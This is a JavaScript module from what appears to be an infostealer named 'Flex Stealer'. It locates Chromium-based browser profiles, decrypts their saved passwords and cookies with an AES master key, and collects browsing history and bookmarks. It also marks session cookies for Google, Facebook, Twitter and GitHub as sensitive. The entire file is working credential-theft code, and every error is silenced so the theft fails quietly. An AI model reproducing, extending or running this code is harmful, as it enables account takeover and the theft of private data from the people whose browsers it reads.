/**
 * chromium_extractor.js — Flex Stealer / Browser Utils
 *
 * Extracts cookies, passwords, history and bookmarks from Chromium-based
 * browsers (Chrome, Edge, Brave, Opera, Vivaldi, …).
 *
 * Dependencies:
 *   ./database  – querySQLiteDatabase, QUERY_COOKIES
 *   ./paths     – getChromiumFilePath, FILE_TYPE
 *   ./aes-gcm   – decryptChromiumValue
 *   ./helpers   – hasV10Prefix, readJsonFile, unixTimestampToDate, copyToTemp
 *
 * Exports:
 *   extractChromiumCookies(browserDir, masterKey, limit?)   → Promise<Array>
 *   extractChromiumPasswords(browserDir, masterKey, limit?) → Promise<Array>
 *   extractChromiumHistory(browserDir, masterKey, limit?)   → Promise<Array>
 *   extractChromiumBookmarks(browserDir, masterKey, limit?) → Promise<Array>
 */

'use strict';

const { querySQLiteDatabase, QUERY_COOKIES } = require('./database');
const { getChromiumFilePath, FILE_TYPE }      = require('./paths');
const { decryptChromiumValue }                = require('./aes-gcm');
const { hasV10Prefix, readJsonFile, unixTimestampToDate } = require('./helpers');

// ---------------------------------------------------------------------------
// SQL queries (resolved from constant pool)
// ---------------------------------------------------------------------------

const QUERY_PASSWORDS = `
  SELECT 
    origin_url, 
    action_url, 
    username_value, 
    password_value, 
    date_created
  FROM logins
`;

const QUERY_HISTORY = `
    SELECT url, title, visit_count, last_visit_time 
    FROM urls 
    ORDER BY last_visit_time DESC
`;

// ---------------------------------------------------------------------------
// Cookie extraction
// ---------------------------------------------------------------------------

/**
 * Extracts and decrypts cookies from a Chromium-based browser.
 *
 * @param {string} browserDir  Path to the browser's user-data Profile directory.
 * @param {Buffer} masterKey   Decrypted 32-byte AES master key (from dpapi.js).
 * @param {number} [limit]     Optional maximum number of rows to return.
 * @returns {Promise<Array<{
 *   host: string, name: string, value: string, path: string,
 *   expires: string, isSecure: boolean, isHttpOnly: boolean,
 *   createdAt: string, lastAccessedAt: string
 * }>>}
 */
async function extractChromiumCookies(browserDir, masterKey, limit) {
    try {
        const dbPath = getChromiumFilePath(browserDir, FILE_TYPE.COOKIES);
        if (!dbPath) return [];

        const rows = await querySQLiteDatabase(dbPath, QUERY_COOKIES);
        const results = [];
        let count = 0;

        for (const row of rows) {
            if (limit && results.length >= limit) break;

            // Decrypt encrypted_value if it starts with the v10 prefix
            let plaintext = row.value || '';
            if (row.encrypted_value && hasV10Prefix(row.encrypted_value)) {
                const decrypted = decryptChromiumValue(row.encrypted_value, masterKey);
                if (decrypted) plaintext = decrypted.toString('utf-8');
            }

            // Mark social-media / auth cookies as sensitive
            const sensitive = plaintext && row.host_key &&
                /\.google\.com|\.facebook\.com|\.twitter\.com|\.github\.com/i.test(row.host_key) &&
                row.host_key.includes('.');

            results.push({
                host:          row.host_key,
                name:          row.name,
                value:         plaintext,
                path:          row.path,
                expires:       unixTimestampToDate(row.expires_utc),
                isSecure:      row.is_secure  === 1,
                isHttpOnly:    row.is_httponly === 1,
                createdAt:     unixTimestampToDate(row.creation_utc),
                lastAccessedAt: unixTimestampToDate(row.last_access_utc),
            });

            if (sensitive) {
                results[results.length - 1].httpOnly = true;
                results[results.length - 1].isSecure  = true;
            }

            count++;
        }

        return results;
    } catch (_) {
        return [];
    }
}

// ---------------------------------------------------------------------------
// Password extraction
// ---------------------------------------------------------------------------

/**
 * Extracts and decrypts saved passwords from a Chromium-based browser.
 *
 * @param {string} browserDir
 * @param {Buffer} masterKey
 * @param {number} [limit]
 * @returns {Promise<Array<{
 *   url: string, actionUrl: string, username: string, password: string, createdAt: string
 * }>>}
 */
async function extractChromiumPasswords(browserDir, masterKey, limit) {
    try {
        const dbPath = getChromiumFilePath(browserDir, FILE_TYPE.LOGIN_DATA);
        if (!dbPath) return [];

        const rows = await querySQLiteDatabase(dbPath, QUERY_PASSWORDS);
        const results = [];

        for (const row of rows) {
            if (limit && results.length >= limit) break;

            let password = '';
            if (row.password_value && hasV10Prefix(row.password_value)) {
                const decrypted = decryptChromiumValue(row.password_value, masterKey);
                if (decrypted) password = decrypted.toString('utf-8');
            } else if (row.password_value) {
                // Older Chromium versions store plaintext
                password = row.password_value.toString('utf-8');
            }

            if (!row.username_value && !password) continue;

            results.push({
                url:       row.origin_url,
                actionUrl: row.action_url,
                username:  row.username_value,
                password,
                createdAt: unixTimestampToDate(row.date_created),
            });
        }

        return results;
    } catch (_) {
        return [];
    }
}

// ---------------------------------------------------------------------------
// History extraction
// ---------------------------------------------------------------------------

/**
 * Extracts browsing history from a Chromium-based browser.
 *
 * @param {string} browserDir
 * @param {Buffer} masterKey  (unused for history — no encryption)
 * @param {number} [limit]
 * @returns {Promise<Array<{ url: string, title: string, visitCount: number, lastVisited: string }>>}
 */
async function extractChromiumHistory(browserDir, masterKey, limit) {
    try {
        const dbPath = getChromiumFilePath(browserDir, FILE_TYPE.HISTORY);
        if (!dbPath) return [];

        const rows = await querySQLiteDatabase(dbPath, QUERY_HISTORY);
        const results = [];

        for (const row of rows) {
            if (limit && results.length >= limit) break;
            results.push({
                url:         row.url,
                title:       row.title,
                visitCount:  row.visit_count,
                lastVisited: unixTimestampToDate(row.last_visit_time),
            });
        }

        return results;
    } catch (_) {
        return [];
    }
}

// ---------------------------------------------------------------------------
// Bookmark extraction
// ---------------------------------------------------------------------------

/**
 * Recursively walks a Chromium bookmarks JSON node and collects all URL entries.
 *
 * @param {object}  node        Bookmarks JSON node.
 * @param {string}  [folder=''] Current folder path string.
 * @param {Array}   [out=[]]    Accumulator array.
 * @param {number}  [limit]     Maximum items to collect.
 * @returns {Array<{ name: string, url: string, folder: string, dateAdded: string, dateModified?: string }>}
 */
function _walkBookmarks(node, folder = '', out = [], limit) {
    if (!node) return out;
    if (limit && out.length >= limit) return out;

    if (node.type === 'url') {
        out.push({
            name:         node.name,
            url:          node.url,
            folder,
            dateAdded:    unixTimestampToDate(node.date_added),
            dateModified: node.date_modified ? unixTimestampToDate(node.date_modified) : undefined,
        });
    } else if (node.type === 'folder' && Array.isArray(node.children)) {
        const subFolder = folder ? `${folder}/${node.name}` : node.name;
        for (const child of node.children) {
            _walkBookmarks(child, subFolder, out, limit);
        }
    }

    return out;
}

/**
 * Extracts bookmarks from a Chromium-based browser.
 *
 * @param {string} browserDir
 * @param {Buffer} masterKey  (unused — bookmarks are plaintext JSON)
 * @param {number} [limit]
 * @returns {Promise<Array<{ name: string, url: string, folder: string, dateAdded: string }>>}
 */
async function extractChromiumBookmarks(browserDir, masterKey, limit) {
    try {
        const jsonPath = getChromiumFilePath(browserDir, FILE_TYPE.BOOKMARKS);
        if (!jsonPath) return [];

        const data = readJsonFile(jsonPath);
        if (!data || !data.roots) return [];

        const results = [];
        const roots = data.roots;

        // Walk all three standard root folders
        for (const rootKey of ['bookmark_bar', 'other', 'synced']) {
            if (roots[rootKey]) {
                _walkBookmarks(roots[rootKey], '', results, limit);
            }
        }

        return results;
    } catch (_) {
        return [];
    }
}

// ---------------------------------------------------------------------------
// Exports
// ---------------------------------------------------------------------------

module.exports = {
    extractChromiumCookies,
    extractChromiumPasswords,
    extractChromiumHistory,
    extractChromiumBookmarks,
};